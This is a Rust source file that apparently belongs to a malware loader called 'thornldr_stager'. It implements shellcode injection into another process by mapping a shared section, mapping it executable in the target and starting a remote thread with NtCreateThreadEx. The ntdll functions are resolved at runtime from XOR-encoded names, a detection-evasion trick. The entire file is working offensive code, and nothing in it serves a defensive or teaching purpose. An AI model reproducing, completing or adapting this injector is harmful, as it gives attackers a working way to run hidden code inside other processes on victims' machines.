// inject.rs — Section-mapped shellcode injection for thornldr_stager.
//
// Shared mapping via NtCreateSection + NtMapViewOfSection — never a
// cross-process memory write:
//
//   1. NtCreateSection (SEC_COMMIT, page-file backed, RWX)
//   2. NtMapViewOfSection into ourselves as RW, write shellcode locally
//   3. NtMapViewOfSection into target as RX (shared — same physical pages)
//   4. NtUnmapViewOfSection of our local view
//   5. NtCreateThreadEx in the target at the remote mapped address
//
// All Nt* functions are resolved from ntdll at runtime via the XOR-encoded
// hash resolver. No direct syscalls — just dynamic function pointers.

use core::ffi::c_void;
use core::sync::atomic::AtomicPtr;

use crate::resolver::{resolve_cached, xor_const, ENC_NTDLL};

// ── Constants ───────────────────────────────────────────────────────────────
const SECTION_ALL_ACCESS:     u32 = 0x000F_001F;
const PAGE_READWRITE:         u32 = 0x04;
const PAGE_EXECUTE_READ:      u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const SEC_COMMIT:             u32 = 0x0800_0000;
const VIEW_UNMAP:             u32 = 2;      // InheritDisposition::ViewUnmap
const THREAD_ALL_ACCESS:      u32 = 0x001F_FFFF;
const NT_CURRENT_PROCESS:     *mut c_void = -1isize as *mut c_void;

// ── Function pointer types ──────────────────────────────────────────────────
type FnNtCreateSection = unsafe extern "system" fn(
    *mut *mut c_void, u32, *mut c_void, *mut i64, u32, u32, *mut c_void,
) -> i32;
type FnNtMapViewOfSection = unsafe extern "system" fn(
    *mut c_void, *mut c_void, *mut *mut c_void, usize, usize,
    *mut i64, *mut usize, u32, u32, u32,
) -> i32;
type FnNtUnmapViewOfSection = unsafe extern "system" fn(
    *mut c_void, *mut c_void,
) -> i32;
type FnNtCreateThreadEx = unsafe extern "system" fn(
    *mut *mut c_void, u32, *mut c_void, *mut c_void, *const c_void,
    *mut c_void, u32, usize, usize, usize, *mut c_void,
) -> i32;
type FnNtClose = unsafe extern "system" fn(*mut c_void) -> i32;

// ── Slots ───────────────────────────────────────────────────────────────────
static SLOT_CREATE: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_MAP:    AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_UNMAP:  AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_THREAD: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());
static SLOT_CLOSE:  AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());

const ENC_CREATE: [u8; 16] = xor_const(*b"NtCreateSection\0");
const ENC_MAP:    [u8; 19] = xor_const(*b"NtMapViewOfSection\0");
const ENC_UNMAP:  [u8; 21] = xor_const(*b"NtUnmapViewOfSection\0");
const ENC_THREAD: [u8; 16] = xor_const(*b"NtCreateThreadEx");
const ENC_CLOSE:  [u8;  9] = xor_const(*b"NtClose\0\0");

#[inline] unsafe fn nt_create_section() -> Option<FnNtCreateSection> {
    let p = resolve_cached(&SLOT_CREATE, &ENC_NTDLL, &ENC_CREATE);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn nt_map_view() -> Option<FnNtMapViewOfSection> {
    let p = resolve_cached(&SLOT_MAP, &ENC_NTDLL, &ENC_MAP);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn nt_unmap_view() -> Option<FnNtUnmapViewOfSection> {
    let p = resolve_cached(&SLOT_UNMAP, &ENC_NTDLL, &ENC_UNMAP);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn nt_create_thread_ex() -> Option<FnNtCreateThreadEx> {
    let p = resolve_cached(&SLOT_THREAD, &ENC_NTDLL, &ENC_THREAD);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}
#[inline] unsafe fn nt_close() -> Option<FnNtClose> {
    let p = resolve_cached(&SLOT_CLOSE, &ENC_NTDLL, &ENC_CLOSE);
    if p.is_null() { None } else { Some(core::mem::transmute(p)) }
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Inject `shellcode` into a target process opened with `PROBE_ACCESS`
/// by `enum_procs::open_for_inject`. Returns true on success.
///// Caller must enumerate and open a target process before calling run().
pub const SPAWNS_OWN_TARGET: bool = false;

/// Pool contract: `pid` is unused by this variant but kept for signature
/// compatibility with other stager_inject pool members.
pub unsafe fn run(_pid: u32, target: *mut c_void, shellcode: &[u8]) -> bool {
    let create_f = match nt_create_section()  { Some(f) => f, None => return false };
    let map_f    = match nt_map_view()        { Some(f) => f, None => return false };
    let unmap_f  = match nt_unmap_view()      { Some(f) => f, None => return false };
    let thread_f = match nt_create_thread_ex(){ Some(f) => f, None => return false };
    let close_f  = match nt_close()           { Some(f) => f, None => return false };

    // 1. Create a page-file-backed RWX shared section.
    let mut section: *mut c_void = core::ptr::null_mut();
    let mut size: i64 = shellcode.len() as i64;
    let status = create_f(
        &mut section,
        SECTION_ALL_ACCESS,
        core::ptr::null_mut(),
        &mut size,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        core::ptr::null_mut(),
    );
    if status < 0 || section.is_null() { return false; }

    // 2. Map the section RW into our own process.
    let mut local_base: *mut c_void = core::ptr::null_mut();
    let mut local_size: usize = 0;
    let mut offset: i64 = 0;
    let status = map_f(
        section, NT_CURRENT_PROCESS, &mut local_base,
        0, shellcode.len(), &mut offset, &mut local_size,
        VIEW_UNMAP, 0, PAGE_READWRITE,
    );
    if status < 0 || local_base.is_null() {
        let _ = close_f(section);
        return false;
    }

    // 3. memcpy shellcode into the local RW view.
    core::ptr::copy_nonoverlapping(
        shellcode.as_ptr(), local_base as *mut u8, shellcode.len(),
    );

    // 4. Map the same section RX into the target.
    let mut remote_base: *mut c_void = core::ptr::null_mut();
    let mut remote_size: usize = 0;
    let mut offset2: i64 = 0;
    let status = map_f(
        section, target, &mut remote_base,
        0, shellcode.len(), &mut offset2, &mut remote_size,
        VIEW_UNMAP, 0, PAGE_EXECUTE_READ,
    );
    if status < 0 || remote_base.is_null() {
        let _ = unmap_f(NT_CURRENT_PROCESS, local_base);
        let _ = close_f(section);
        return false;
    }

    // 5. Unmap our local view.
    let _ = unmap_f(NT_CURRENT_PROCESS, local_base);

    // 6. Kick a thread in the target at the remote mapped address.
    let mut h_thread: *mut c_void = core::ptr::null_mut();
    let status = thread_f(
        &mut h_thread, THREAD_ALL_ACCESS, core::ptr::null_mut(),
        target, remote_base as *const c_void, core::ptr::null_mut(),
        0, 0, 0, 0, core::ptr::null_mut(),
    );
    if status >= 0 && !h_thread.is_null() {
        let _ = close_f(h_thread);
    }
    let _ = close_f(section);
    status >= 0
}
